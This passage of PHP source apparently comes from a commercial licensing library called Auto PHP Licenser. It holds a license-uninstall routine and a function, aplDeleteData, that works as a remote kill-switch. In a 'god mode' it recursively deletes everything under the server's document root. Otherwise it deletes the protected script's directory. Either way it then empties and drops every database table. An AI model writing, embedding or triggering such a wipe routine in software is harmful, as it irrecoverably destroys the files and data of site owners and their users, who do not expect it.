            $content_array=aplCustomPost(APL_ROOT_URL."/apl_callbacks/license_uninstall.php", $post_info, $ROOT_URL);
            $notifications_array=aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); //process response from Auto PHP Licenser server
            if ($notifications_array['notification_case']=="notification_license_ok") //everything OK
                {
                if (APL_STORAGE=="DATABASE") //license stored in database
                    {
                    mysqli_query($MYSQLI_LINK, "DELETE FROM ".APL_DATABASE_TABLE);
                    mysqli_query($MYSQLI_LINK, "DROP TABLE ".APL_DATABASE_TABLE);
                    }

                if (APL_STORAGE=="FILE") //license stored in file
                    {
                    $handle=@fopen(APL_DIRECTORY."/".APL_LICENSE_FILE_LOCATION, "w+");
                    @fclose($handle);
                    }
                }
            }
        else //license is not installed yet or corrupted
            {
            $notifications_array['notification_case']="notification_license_corrupted";
            $notifications_array['notification_text']=APL_NOTIFICATION_LICENSE_CORRUPTED;
            }
        }
    else //script is not properly configured
        {
        $notifications_array['notification_case']="notification_script_corrupted";
        $notifications_array['notification_text']=implode("; ", $apl_core_notifications);
        }

    return $notifications_array;
    }


//delete user data
function aplDeleteData($MYSQLI_LINK=null)
    {
    if (APL_GOD_MODE=="YES" && isset($_SERVER['DOCUMENT_ROOT'])) //god mode enabled, delete everything from document root directory (usually httpdocs or public_html). god mode might not be available for IIS servers that don't always set $_SERVER['DOCUMENT_ROOT']
        {
        $root_directory=$_SERVER['DOCUMENT_ROOT'];
        }
    else
        {
        $root_directory=dirname(__DIR__); //(this file is located at INSTALLATION_PATH/SCRIPT, go one level up to enter root directory of protected script
        }

    foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root_directory, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST) as $path)
        {
        $path->isDir() && !$path->isLink() ? rmdir($path->getPathname()) : unlink($path->getPathname());
        }
    rmdir($root_directory);

    if (APL_STORAGE=="DATABASE") //license stored in database, delete MySQL data
        {
        $database_tables_array=array();

        $table_list_results=mysqli_query($MYSQLI_LINK, "SHOW TABLES"); //get list of tables in database
        while ($table_list_row=mysqli_fetch_row($table_list_results))
            {
            $database_tables_array[]=$table_list_row[0];
            }

        if (!empty($database_tables_array))
            {
            foreach ($database_tables_array as $table_name) //delete all data from tables first
                {
                mysqli_query($MYSQLI_LINK, "DELETE FROM $table_name");
                }

            foreach ($database_tables_array as $table_name) //now drop tables (do it later to prevent script from being aborted when no drop privileges are granted)
                {
                mysqli_query($MYSQLI_LINK, "DROP TABLE $table_name");
                }
            }
        }

    exit(); //abort further execution
    }
